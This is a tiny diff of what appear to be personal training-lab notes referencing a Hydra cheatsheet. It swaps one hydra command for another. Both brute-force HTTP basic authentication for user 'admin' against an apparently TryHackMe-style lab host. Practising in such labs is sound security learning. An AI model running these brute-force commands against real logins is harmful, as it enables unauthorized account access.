@@ -1,2 +1,3 @@
 file:///root/Hydra-Password-Cracking-Cheatsheet.pdf
-hydra -l admin -P 500-worst-passwords.txt http-get http://enum.thm/labs/basic_auth/:A=BASIC -vV
+hydra -l admin -P pass.txt http-get://enum.thm/labs/basic_auth/:A=BASIC -vV
+
